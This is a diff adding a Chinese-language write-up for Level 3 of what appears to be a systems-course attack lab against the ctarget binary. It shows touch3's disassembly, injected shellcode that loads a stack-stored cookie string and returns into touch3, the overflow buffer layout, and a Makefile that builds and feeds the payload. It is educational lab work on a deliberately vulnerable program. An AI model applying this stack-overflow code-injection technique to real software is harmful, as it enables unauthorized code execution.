@@ -233,3 +233,101 @@ NICE JOB!
 ```
 
 == Level 3: 防护机制绕过
+
+本阶段任务与level 2基本相同，但要传递的参数变为了一个字符串——也就是说，需要传递一个地址作为参数，并自己管理字符串的存储。
+
+首先查看 `touch3` 函数的地址：
+```asm
+0000000000808b1b <touch3>:
+  808b1b:	53                   	push   rbx
+  808b1c:	48 89 fb             	mov    rbx,rdi
+  808b1f:	c7 05 d3 39 20 00 03 	mov    DWORD PTR [rip+0x2039d3],0x3        # a0c4fc <vlevel>
+  808b26:	00 00 00
+  808b29:	48 89 fe             	mov    rsi,rdi
+  808b2c:	8b 3d d2 39 20 00    	mov    edi,DWORD PTR [rip+0x2039d2]        # a0c504 <cookie>
+  808b32:	e8 31 ff ff ff       	call   808a68 <hexmatch>
+  808b37:	85 c0                	test   eax,eax
+  808b39:	74 2d                	je     808b68 <touch3+0x4d>
+  808b3b:	48 89 da             	mov    rdx,rbx
+  808b3e:	48 8d 35 3b 18 00 00 	lea    rsi,[rip+0x183b]        # 80a380 <_IO_stdin_used+0x2f0>
+  808b45:	bf 01 00 00 00       	mov    edi,0x1
+  808b4a:	b8 00 00 00 00       	mov    eax,0x0
+  808b4f:	e8 8c 82 bf ff       	call   400de0 <__printf_chk@plt>
+  808b54:	bf 03 00 00 00       	mov    edi,0x3
+  808b59:	e8 79 03 00 00       	call   808ed7 <validate>
+  808b5e:	bf 00 00 00 00       	mov    edi,0x0
+  808b63:	e8 b8 82 bf ff       	call   400e20 <exit@plt>
+  808b68:	48 89 da             	mov    rdx,rbx
+  808b6b:	48 8d 35 36 18 00 00 	lea    rsi,[rip+0x1836]        # 80a3a8 <_IO_stdin_used+0x318>
+  808b72:	bf 01 00 00 00       	mov    edi,0x1
+  808b77:	b8 00 00 00 00       	mov    eax,0x0
+  808b7c:	e8 5f 82 bf ff       	call   400de0 <__printf_chk@plt>
+  808b81:	bf 03 00 00 00       	mov    edi,0x3
+  808b86:	e8 1c 04 00 00       	call   808fa7 <fail>
+  808b8b:	eb d1                	jmp    808b5e <touch3+0x43>
+```
+得到 `touch3` 函数的地址为 `0x0808b1b`。
+
+我们要写入的 shellcode 如下：
+```asm
+    .text
+    .globl _start
+_start:
+    pushq $touch3_addr      # RSP -= 8; [RSP] = touch3
+    lea 8(%rsp), %rdi       # RDI = RSP + 8 = &cookie_string
+    ret                     # ret to touch3
+```
+所以我们还需要在栈上存储 `cookie` 字符串，以便传递给 `touch3` 函数。
+
+可以将 `cookie` 字符串放在 shellcode 之后，计算其在栈上的地址，然后传递给 `touch3` 函数。
+```makefile
+COOKIE := $(shell cat cookie.txt)
+COOKIE_PURE := $(shell echo $(COOKIE) | sed 's/^0x//')
+COOKIE_ASCII_HEX := $(shell printf '%s\0' $(COOKIE_PURE) | xxd -p | sed 's/../& /g')
+```
+缓冲区最后如下
+```
+[ shellcode:
+  pushq $touch3_addr
+  lea 8(%rsp), %rdi
+  ret
+] + [ padding to fill buf ]
+[ new return address: buf_start_addr ]
+[ cookie string in ASCII hex ]
+```
+我们没有把字符串塞在 `getbuf` 的局部变量区域内，而是放在覆盖后的返回地址上方；让 `ret` 之后的 `rsp` 刚好指向字符串；再用 `lea 8(%rsp), %rdi` 利用这个相对位置；后续 `touch3/hexmatch/strncmp` 的栈帧分配都只会往更小的地址长，不会碰到高地址的字符串区域。
+
+生成攻击输入的 makefile 代码如下：
+```makefile
+$(OUT)/level3_payload.s:
+	mkdir -p $(OUT)
+	echo "    .text" > $@
+	echo "    .globl _start" >> $@
+	echo "_start:" >> $@
+	echo "    pushq $$ $(TOUCH3_ADDR)" >> $@
+	echo "    lea 8(%rsp), %rdi" >> $@
+	echo "    ret" >> $@
+
+$(OUT)/level3_payload.d: $(OUT)/level3_payload.s
+	gcc -c $< -o $(OUT)/level3_payload.o
+	objdump -M intel -d $(OUT)/level3_payload.o > $@
+
+$(OUT)/level3_payload.hex: $(OUT)/level3_payload.d
+	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
+		for (i=2; i<=NF; i++) { \
+			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
+			else break; \
+		} \
+	} END { printf "\n"; }' > $@
+
+level3: $(OUT)/level3_payload.hex disas_ctarget
+	mkdir -p $(SRC)
+	tr -d '\n' < $(OUT)/level3_payload.hex > $(SRC)/ctarget03.txt
+	for i in `seq 13`; do \
+		echo -n "41 " >> $(SRC)/ctarget03.txt; \
+	done
+	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget03.txt
+	echo -n "$(COOKIE_ASCII_HEX)" >> $(SRC)/ctarget03.txt
+	./hex2raw < $(SRC)/ctarget03.txt > $(OUT)/level3-raw.txt
+	./ctarget < $(OUT)/level3-raw.txt
+```
